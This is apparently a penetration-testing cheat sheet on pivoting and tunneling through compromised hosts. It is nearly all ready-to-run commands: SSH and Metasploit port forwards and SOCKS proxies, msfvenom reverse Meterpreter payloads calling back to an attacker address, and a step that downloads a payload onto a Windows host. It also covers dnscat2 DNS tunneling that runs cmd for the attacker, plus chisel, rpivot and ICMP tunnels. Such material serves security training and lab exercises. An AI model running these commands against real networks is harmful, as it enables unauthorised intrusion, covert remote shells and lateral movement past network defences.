# Pivoting, Tunneling, and Port Forwarding

## Basic Network Recon

```bash
ifconfig            # Linux
ipconfig             # Windows
netstat -r           # routing table
```

## SSH Local Port Forwarding

```bash
ssh -L 1234:localhost:3306 ubuntu@<TARGET>
```
Forwards local port 1234 to `<TARGET>`'s local view of port 3306 (e.g. MySQL bound to localhost on the target). Verify and scan through it:
```bash
netstat -antp | grep 1234
nmap -v -sV -p1234 localhost
```

**Multiple forwards in one connection:**
```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@<TARGET>
```

## SSH Dynamic Forwarding (SOCKS Proxy)

```bash
ssh -D 9050 ubuntu@<TARGET>
```

Configure Proxychains (`/etc/proxychains.conf`):
```
socks4 127.0.0.1 9050
```

Route any tool's traffic through the tunnel:
```bash
proxychains nmap -v -sn <CIDR>
proxychains nmap -v -Pn -sT <TARGET>
proxychains msfconsole
proxychains xfreerdp /v:<TARGET> /u:<USER> /p:<PASS>
proxychains firefox-esr <TARGET>:80
```

## SSH Remote (Reverse) Port Forwarding

```bash
ssh -R <PIVOT_INTERNAL_IP>:8080:0.0.0.0:80 ubuntu@<TARGET> -vN
```
Exposes a service reachable from the pivot host outward to the attacker's listener — useful when the attacker can't initiate inbound connections to the target network.

## Metasploit Pivoting

```
msf6 > use post/multi/manage/autoroute            # route Metasploit traffic through a session
msf6 > use auxiliary/server/socks_proxy            # stand up a SOCKS proxy through a session
msf6 auxiliary(server/socks_proxy) > jobs
msf6 > run post/multi/gather/ping_sweep RHOSTS=<CIDR>
```

**Meterpreter port forwarding:**
```
meterpreter > portfwd add -l 3300 -p 3389 -r <TARGET>          # forward local 3300 -> target's 3389
meterpreter > portfwd add -R -l 8081 -p 1234 -L <ATTACKER_IP>  # reverse forward
meterpreter > bg                                                # background the session
```

## Payload Generation & Transfer

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<PIVOT_INTERNAL_IP> LPORT=8080 -f exe -o payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -f elf -o payload
```
```bash
scp payload.exe ubuntu@<TARGET>:~/
python3 -m http.server 8123
```
```powershell
Invoke-WebRequest -Uri "http://<PIVOT_IP>:8123/payload.exe" -OutFile "C:\payload.exe"
```

## Host Discovery Without Nmap

```bash
for i in {1..254}; do (ping -c 1 <SUBNET>.$i | grep "bytes from" &); done       # Linux
```
```
for /L %i in (1 1 254) do ping <SUBNET>.%i -n 1 -w 100 | find "Reply"          # Windows cmd
```
```powershell
1..254 | % {"<SUBNET>.$($_): $(Test-Connection -count 1 -comp <SUBNET>.$($_) -quiet)"}
```

## Socat Relay

```bash
socat TCP4-LISTEN:8080,fork TCP4:<ATTACKER_IP>:80
socat TCP4-LISTEN:8080,fork TCP4:<TARGET>:8443
```

## Windows SOCKS Proxy (Plink)

```
plink -D 9050 ubuntu@<TARGET>
```
Windows equivalent of `ssh -D` — enables Proxychains-style tunneling from a Windows attacker/pivot host.

## sshuttle (transparent VPN-style routing)

```bash
sudo apt-get install sshuttle
sudo sshuttle -r ubuntu@<TARGET> <INTERNAL_CIDR> -v
```

## rpivot

```bash
sudo git clone https://github.com/klsecservices/rpivot.git
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0    # attacker
scp -r rpivot ubuntu@<TARGET>
python2.7 client.py --server-ip <ATTACKER_IP> --server-port 9999                # target
```

**Through an NTLM-authenticated proxy:**
```bash
python client.py --server-ip <TARGET> --server-port 8080 --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port 8081 --domain <DOMAIN> --username <USER> --password <PASS>
```

## Windows Native Port Proxy

```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=<PIVOT_IP> connectport=3389 connectaddress=<TARGET_INTERNAL>
netsh.exe interface portproxy show v4tov4
```

## DNS Tunneling — dnscat2

```bash
git clone https://github.com/iagox86/dnscat2.git
sudo ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<DOMAIN> --no-cache
```
```powershell
Import-Module dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACKER_IP> -Domain <DOMAIN> -PreSharedSecret <SECRET> -Exec cmd
```
```
dnscat2> window -i 1     # interact with a session
```

## Chisel

```bash
./chisel server -v -p 1234 --socks5              # attacker
./chisel client -v <ATTACKER_IP>:1234 socks       # target
```

Real applied example — tunneling to an internal-only WCF service: [Overwatch](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/overwatch.md)

## ICMP Tunneling — ptunnel-ng

```bash
git clone https://github.com/utoni/ptunnel-ng.git
sudo ./autogen.sh
sudo ./ptunnel-ng -r<TARGET> -R22                              # server side
sudo ./ptunnel-ng -p<TARGET> -l2222 -r<TARGET> -R22             # client side
ssh -p2222 -lubuntu 127.0.0.1
```

## RDP-based SOCKS (SocksOverRDP)

```
regsvr32.exe SocksOverRDP-Plugin.dll
netstat -antb | findstr 1080
```

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README.md) collection. Applied example: [Overwatch](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/overwatch.md) (Chisel tunnel to reach an internal WCF service)*

</div>
